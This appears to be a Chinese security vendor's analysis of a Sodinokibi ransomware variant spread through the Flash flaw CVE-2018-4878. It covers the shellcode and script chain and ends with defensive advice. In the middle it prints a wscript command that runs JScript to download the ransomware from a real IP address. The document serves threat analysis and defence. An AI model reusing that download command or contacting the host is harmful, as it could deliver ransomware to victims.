**自GandCrab宣布停止运营以来，勒索病毒攻击事件并没有随着GandCrab的退出而减少，全球各地每天仍有用户因为数据遭到加密而损失惨重。在后来居上的各个勒索病毒家族中，Sodinokibi勒索已经成为了现在全球最流行的勒索病毒之一，也叫称为GandCrab的”接班人”。**

Sodinokibi勒索病毒的部分变种在加密后会将受害主机的屏幕设置成深蓝色，因此也被称为“DeepBlue”勒索，早在该勒索病毒活动的初期，就已捕获到其利用Confluence漏洞(CVE-2019-3396)进行攻击的案例：[《警惕“侠盗”团伙利用新型漏洞传播GandCrab勒索“蓝屏”变种》](https://mp.weixin.qq.com/s/0-5xweSvuGpDhHdNAMO6qg)

近日，国外安全研究人员发现Sodinokibi勒索病毒利用CVE-2018-4878漏洞进行传播，深信服安全团队第一时间捕获到了相应的样本，并进行了详细分析。

## **一、漏洞利用分析**

CVE-2018-4878漏洞是一个UAF漏洞，位于Flash的com.adobe.tvsdk包中，如下所示：

![图片
\(1\).png](https://image.3001.net/images/20190722/1563786834_5d357e52093e3.png!small)

shellcode代码通过获取CreateProcessA的函数地址，调用CMD命令执行恶意下载操作，如下所示：

![图片
\(2\).png](https://image.3001.net/images/20190722/1563786843_5d357e5b7ef92.png!small)

动态调式，获取CMD命令，如下所示：

![图片
\(3\).png](https://image.3001.net/images/20190722/1563786854_5d357e66059aa.png!small)

获取的CMD命令代码，如下所示：

![图片
\(4\).png](https://image.3001.net/images/20190722/1563786871_5d357e776f9aa.png!small)

通过CMD命令，调用WScript进程执行脚本，如下所示：

![图片
\(5\).png](https://image.3001.net/images/20190722/1563786882_5d357e8207690.png!small)

调用脚本命令参数，如下所示：

![图片
\(6\).png](https://image.3001.net/images/20190722/1563786887_5d357e87db898.png!small)

脚本内容，如下所示：

    
    
    wsCripT  //B  //E:JScript T.t "ctELwuzs5N95a"
    
    "http://176.57.220.28/?NTcxMDkx&OHqFPlRweVwKRC&PbNNzQhVmHSdZF=difference&t4tsdfsg4=7cDOArojBfTcwxlmosOVl1B86D7i0fVz0LPhJ6FqEfeNA0U_aKTErg92lr8zLgkLYsk9w&SGZPTVoZDZUE=constitution&mtcfabVTX=referred&TfDencoKhLpWmWy=detonator&CMIHZK=everyone&jsUXxcuwwzXQs=known&niJebNseKTId=detonator&SkHDbOnITQuC=wrapped&fwFOBGCULm=professional&AiNfixYteBuTPc=professional&wpdPCwSHxUCq=community&ff5sdfds=w3nQMvXcJxnQFYbGMv3DSKNbNkbWHViPxoiG9MildZmqZGX_k7vDfF-qoVXcCgWRxfQuf&LUbaPnkXKQhJ=known&pUljixFjY=community&fspuvfWRXEoRhF=known&UolvaBlNUoGliy=referred&dcavylKzLRHQNDE2Nzk4"    "?

通过脚本下载Sodinokibi勒索病毒，能通过动态调试，提取出里面核心Payload，如下所示：

![图片
\(7\).png](https://image.3001.net/images/20190722/1563786897_5d357e910b176.png!small)

将此勒索变种的核心功能代码与我们之前捕获分析的Sodinokibi勒索病毒核心代码进行对比分析，如下所示：

![图片
\(8\).png](https://image.3001.net/images/20190722/1563786919_5d357ea74d42a.png!small)

代码的相似度达到94%以上，可以认定为是Sodinokibi勒索病毒的变种样本，此勒索病毒变种生成的最新的“蓝屏”桌面背景，如下所示：

![图片
\(9\).png](https://image.3001.net/images/20190722/1563786990_5d357eee04f02.png!small)

生成的勒索信息文本，如下所示：

![图片
\(10\).png](https://image.3001.net/images/20190722/1563786933_5d357eb544aa2.png!small)

解密的网址，如下所示：

![图片
\(11\).png](https://image.3001.net/images/20190722/1563786977_5d357ee12eb32.png!small)

##  **二、解决方案**

遗憾的是，这款病毒暂时还没有解密工具，建议尽快对感染主机进行断网隔离。广大用户请做好病毒检测与防御措施，防范该病毒家族的勒索攻击。

###  **病毒防御**

再次提醒广大用户，勒索病毒以防为主，目前大部分勒索病毒加密后的文件都无法解密，注意日常防范措施：

> 1.及时给电脑打补丁，修复漏洞。
>
> 2.对重要的数据文件定期进行非本地备份。
>
> 3.不要点击来源不明的邮件附件，不从不明网站下载软件。
>
> 4.尽量关闭不必要的文件共享权限。
>
> 5.更改账户密码，设置强密码，避免使用统一的密码，因为统一的密码会导致一台被攻破，多台遭殃。
>
> 6.如果业务上无需使用RDP的，建议关闭RDP。

最后，建议企业对全网进行一次安全检查和杀毒扫描，加强防护工作。

